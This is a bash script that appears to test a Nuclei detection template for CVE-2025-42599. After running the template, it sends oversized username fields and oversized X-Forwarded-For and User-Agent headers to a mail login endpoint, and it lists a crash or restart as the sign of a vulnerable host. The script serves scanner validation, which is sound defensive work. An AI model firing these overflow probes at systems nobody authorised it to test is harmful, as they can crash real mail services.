#!/bin/bash

# Test script for CVE-2025-42599 Nuclei template
# Usage: ./test-cve-2025-42599.sh <target-url>

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if target URL is provided
if [ $# -eq 0 ]; then
    echo -e "${RED}Error: Target URL is required${NC}"
    echo "Usage: $0 <target-url>"
    echo "Example: $0 http://192.168.1.100"
    exit 1
fi

TARGET_URL="$1"
TEMPLATE_PATH="http/cves/2025/CVE-2025-42599.yaml"

echo -e "${YELLOW}=== CVE-2025-42599 Template Test ===${NC}"
echo "Target: $TARGET_URL"
echo "Template: $TEMPLATE_PATH"
echo ""

# Check if nuclei is installed
if ! command -v nuclei &> /dev/null; then
    echo -e "${RED}Error: nuclei is not installed${NC}"
    echo "Please install nuclei from: https://nuclei.projectdiscovery.io/"
    exit 1
fi

# Check if template exists
if [ ! -f "$TEMPLATE_PATH" ]; then
    echo -e "${RED}Error: Template not found at $TEMPLATE_PATH${NC}"
    echo "Please run this script from the nuclei-templates directory"
    exit 1
fi

echo -e "${YELLOW}1. Testing basic connectivity...${NC}"
if curl -s -I "$TARGET_URL" > /dev/null; then
    echo -e "${GREEN}✓ Target is reachable${NC}"
else
    echo -e "${RED}✗ Target is not reachable${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}2. Running Nuclei template test...${NC}"
echo "Command: nuclei -u $TARGET_URL -t $TEMPLATE_PATH -debug -v"

# Run nuclei with debug output
nuclei -u "$TARGET_URL" -t "$TEMPLATE_PATH" -debug -v

echo ""
echo -e "${YELLOW}3. Manual validation tests...${NC}"

# Test 1: Basic overflow payload
echo -e "${YELLOW}Test 1: Basic overflow payload${NC}"
curl -s -X POST "$TARGET_URL/mail/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$(python3 -c 'print("A"*1024)')&password=test" \
  -w "Status: %{http_code}\n" \
  -o /dev/null

# Test 2: Malformed headers
echo -e "${YELLOW}Test 2: Malformed headers${NC}"
curl -s -X POST "$TARGET_URL/mail/login" \
  -H "X-Forwarded-For: $(python3 -c 'print("A"*1024)')" \
  -H "User-Agent: $(python3 -c 'print("B"*1024)')" \
  -d "username=test&password=test" \
  -w "Status: %{http_code}\n" \
  -o /dev/null

# Test 3: Extended payload
echo -e "${YELLOW}Test 3: Extended payload${NC}"
curl -s -X POST "$TARGET_URL/mail/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$(python3 -c 'print("D"*2048)')&password=test" \
  -w "Status: %{http_code}\n" \
  -o /dev/null

echo ""
echo -e "${YELLOW}4. Template validation summary...${NC}"

# Check template syntax
echo -e "${YELLOW}Validating template syntax...${NC}"
if nuclei -validate -t "$TEMPLATE_PATH"; then
    echo -e "${GREEN}✓ Template syntax is valid${NC}"
else
    echo -e "${RED}✗ Template syntax has errors${NC}"
fi

echo ""
echo -e "${YELLOW}=== Test Complete ===${NC}"
echo ""
echo -e "${GREEN}Expected results for vulnerable systems:${NC}"
echo "- HTTP 500/502/503 status codes"
echo "- 'Internal Server Error' in response body"
echo "- Service crash or restart"
echo "- Connection close headers"
echo ""
echo -e "${GREEN}Expected results for non-vulnerable systems:${NC}"
echo "- HTTP 200/401/403 status codes"
echo "- Normal application responses"
echo "- No buffer overflow errors"
echo ""
echo -e "${YELLOW}For detailed analysis, check:${NC}"
echo "- Application logs"
echo "- System logs (dmesg, journalctl)"
echo "- Service status"
echo "- Core dumps (if any)"
